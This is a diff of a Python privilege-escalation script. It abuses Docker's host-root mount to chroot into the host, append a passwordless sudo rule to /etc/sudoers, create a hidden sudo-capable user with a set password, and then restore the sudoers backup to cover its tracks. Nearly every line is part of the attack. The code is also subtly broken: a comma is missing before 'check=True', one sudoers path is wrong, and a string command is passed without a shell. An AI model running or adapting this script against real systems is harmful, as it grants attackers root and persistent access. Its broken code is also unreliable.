@@ -33,20 +33,21 @@ def main():
     ["openssl", "passwd", "-6", NuserPasswd],
     capture_output=True,
     text=True
+    check=True
     )
     HashedNuserPasswd = tmpHash.stdout.strip()
 
     # Payload generation
-    payload = ["docker", "run", "--rm", "-i", "-v", "/:/mnt", "alpine", "chroot", "/mnt", "/bin/sh", "-c", f"cd /etc && cp sudoers sudoers.tmp && echo '{Kuser} ALL=(ALL) NOPASSWD: ALL' >> sudoers", ]
+    payload = ["docker", "run", "--rm", "-i", "-v", "/:/mnt", "alpine", "chroot", "/mnt", "/bin/sh", "-c", f"cp /etc/sudoers /etc/sudoers.tmp && echo '{Kuser} ALL=(ALL) NOPASSWD: ALL' >> sudoers", ]
     
     # Privilege escalation
     subprocess.run(f'''docker run --rm -i -v /:/mnt alpine chroot /mnt /bin/sh -c 'cd /etc && cp ./sudoers ./sudoers.tmp && echo "{Kuser} ALL=(ALL) NOPASSWD: ALL" >> sudoers' ''')
 
-    subprocess.run(["sudo", "useradd", "-m", Nuser])
+    subprocess.run(["sudo", "useradd", "-m", Nuser], check=True)
     subprocess.run(["sudo", "usermod", "-p", HashedNuserPasswd, Nuser])
     subprocess.run(["sudo", "usermod", "-aG", "sudo", Nuser])
 
-    subprocess.run(["cp", "sudoers.tmp", "sudoers"])
+    subprocess.run(["mv", "/etc/sudoers.tmp", "/etc/sudoers"])
     sys.exit(0)
 
 if __name__ == "__main__":
